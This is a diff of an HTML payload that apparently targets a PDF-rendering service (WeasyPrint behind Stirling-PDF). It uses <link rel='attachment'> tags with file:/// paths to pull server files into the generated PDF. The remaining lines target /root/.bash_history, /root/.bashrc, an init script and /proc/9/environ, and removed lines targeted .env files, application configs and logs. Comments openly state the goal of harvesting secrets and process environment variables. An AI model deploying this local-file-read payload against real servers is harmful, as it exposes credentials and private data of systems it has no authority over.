@@ -5,35 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
 </head>
-<!-- Get parent Java process environment (PID 1 or parent of WeasyPrint) -->
-<!-- The main Java application JAR -->
-<link rel="attachment" href="file:///app.jar">
+<!-- <link rel="attachment" href="file:///app.jar"> -->
 
-<!-- Init script (may contain secrets or setup commands) -->
 <link rel="attachment" href="file:///scripts/init.sh">
 
-<!-- Look for other scripts in the directory -->
-<link rel="attachment" href="file:///scripts/install_dependencies.sh">
-<link rel="attachment" href="file:///scripts/setup.sh">
 
-<!-- Application working directory -->
-<link rel="attachment" href="file:///application.yml">
-<link rel="attachment" href="file:///application.properties">
-<link rel="attachment" href="file:///.env">
-
-<!-- Since init runs as root, try root's files -->
 <link rel="attachment" href="file:///root/.bashrc">
 <link rel="attachment" href="file:///root/.bash_history">
 
-<!-- Check for environment file in root -->
-<link rel="attachment" href="file:///usr/src/app/.env">
-<link rel="attachment" href="file:///usr/src/app/application.properties">
 
-<!-- Logs -->
-<link rel="attachment" href="file:///logs/application.log">
-<link rel="attachment" href="file:///var/log/stirling-pdf.log">
-
-<!-- Get the Java process environ (child of tini) -->
 <link rel="attachment" href="file:///proc/9/environ">
 <link rel="attachment" href="file:///proc/9/cmdline">
 </body>
